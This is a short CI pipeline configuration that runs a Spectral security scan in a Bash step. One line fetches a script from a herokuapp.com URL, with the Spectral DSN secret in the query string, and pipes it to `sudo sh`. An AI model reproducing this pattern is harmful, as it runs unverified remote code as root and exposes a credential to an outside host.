pipelines:
  - name: SpectralProtection
    steps:
      - name: SpectralScan
        type: Bash
        configuration:
            integrations:
                - name: spectraldsn
        execution:
          onExecute:
            - ls
            - ls workspace
            - ls workspace/download
            - ls output
            - git status
            - curl -L "https://calm-ridge-50342.herokuapp.com/latest/sh?dsn=$int_spectraldsn_SPECTRAL_DSN" | sudo sh
            - spectral scan --dsn $int_spectraldsn_SPECTRAL_DSN

